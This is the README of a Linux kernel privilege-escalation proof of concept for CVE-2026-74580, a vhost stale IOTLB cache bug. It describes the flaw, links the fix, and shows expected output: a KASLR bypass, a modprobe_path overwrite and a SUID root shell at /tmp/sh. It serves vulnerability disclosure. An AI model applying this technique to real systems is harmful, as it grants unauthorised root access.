# Vghost — CVE-2026-74580

Original code and readme file from:
https://github.com/zhangutah/security-research

## linux privilege escalation
Expected output:
```bash
./poc
=== vhost stale IOTLB metadata cache -> modprobe_path write ===
[*] static: _stext=0xffffffff81000000 asm_exc_de=0xffffffff81001030 modprobe_path=0xffffffff83731920
[*] modprobe_path before: "/tmp/pwn"

[*] Step 1: KASLR bypass via IDT[0]
[*] reading IDT[0] @ 0xfffffe0000000000
[+] asm_exc_divide_error runtime 0xffffffffa4e01030, slide 0x23e00000
[+] runtime modprobe_path @ 0xffffffffa7531920

[*] Step 2: overwriting modprobe_path with a marker
[+] kwrite_str: "/tmp/pwn" -> 0xffffffffa7531920

[*] Step 3: verifying via /proc/sys/kernel/modprobe
[*] modprobe_path after:  "/tmp/pwn"

[*] Step 4: Privilege Escalation
[+] Triggered request_module() call.
[+] SUID shell created at /tmp/sh
[*] Exec shell at /tmp/sh ...

sh-5.3# whoami
root
```

## Description
`vq->meta_iotlb[]` caches the IOTLB mapping behind each vring metadata region
(`desc` / `avail` / `used`). `VHOST_SET_VRING_ADDR` and `VHOST_SET_VRING_NUM`
do not reset that cache. With a device IOTLB attached, a live vq can translate
a reconfigured vring through a mapping that no longer covers it.
`vhost_vq_meta_fetch()` has no range check, and the result is passed to
`__copy_to_user()` / `__copy_from_user()`.

The same stale cache is reachable from a guest when vhost runs in device-IOTLB
mode (`VIRTIO_F_ACCESS_PLATFORM` / vIOMMU) and the guest resets a virtqueue
via `VIRTIO_F_RING_RESET`. That path is not this PoC.

- CVE: [CVE-2026-74580](https://www.cve.org/CVERecord?id=CVE-2026-74580) (CVSS 8.8)
- Writeup: [Vghost](https://matrix.tencent.com/en/2026/10/12/vghost-cve-2026-74580) 
- Fix: [`de845981da67`](https://git.kernel.org/linus/de845981da67a6b049080c87e605130b0c30adc5)

`poc.c` is a host x86-64 PoC against `/dev/vhost-vsock`. It opens a root shell as euid=0. It creates /tmp/sh as suid root. Delete the file after testing manually!
## Usage

```bash
cc -O2 -Wall -Wextra -o poc poc.c
./poc
```

Symbol lookup uses, in order: `$SYSTEM_MAP`, `/boot/System.map-$(uname -r)`,
`/usr/lib/modules/$(uname -r)/build/System.map`. `modprobe_path` must be
present; `asm_exc_divide_error` falls back to a static address if missing.

The process must be able to open `/dev/vhost-vsock`. Some images ship that node
`0666`; others are `0660 root:kvm`.

Run only on a disposable test system you own.